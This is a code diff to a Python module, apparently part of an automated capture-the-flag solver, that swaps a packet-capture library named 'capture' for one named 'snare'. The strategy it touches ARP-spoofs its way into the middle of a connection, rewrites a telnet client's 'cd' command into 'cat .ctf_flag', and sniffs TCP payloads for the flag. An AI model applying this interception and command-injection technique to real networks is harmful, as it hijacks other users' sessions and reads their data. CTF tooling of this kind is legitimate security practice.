@@ -1,9 +1,9 @@
 # coding: utf-8
-import scapy.all as scapy
-import capture
-import strategy
 import logging
 import re
+import scapy.all as scapy
+import snare
+import strategy
 
 logger = logging.getLogger(__name__)
 
@@ -16,7 +16,7 @@ class Strategy(strategy.Strategy):
     needsip = True
     challenges = ['straw', 'sticks', 'brick']
 
-    class AnalysisModule(capture.Module):
+    class AnalysisModule(snare.Module):
         """AnalysisModule looks at any TCP packet with a payload for the flag and stops the sniffer when it is found"""
         def __init__(self, flagpattern):
             self.flagpattern = flagpattern
@@ -40,7 +40,7 @@ class Strategy(strategy.Strategy):
                     self.flag = m.group(0)
                     self.sniffer.stop()
 
-    @capture.tcpfilter
+    @snare.tcpfilter
     @staticmethod
     def injectcmd(pkt):
         """injectcmd looks for a telnet client packet and if it has the `cd` command, reaplces it with `cat .ctf_flag`"""
@@ -52,11 +52,11 @@ class Strategy(strategy.Strategy):
         return pkt
 
     def execute(self, iface, flagpattern="flag\{.*?\}", canceltoken=None):
-        sniffer = capture.Sniffer(iface=iface)
+        sniffer = snare.Sniffer(iface=iface)
         analyser = self.AnalysisModule(flagpattern)
         sniffer.register(
             analyser,
-            capture.ArpMitmModule(filter=self.injectcmd)
+            snare.ArpMitmModule(filter=self.injectcmd)
         )
 
         if canceltoken is not None:
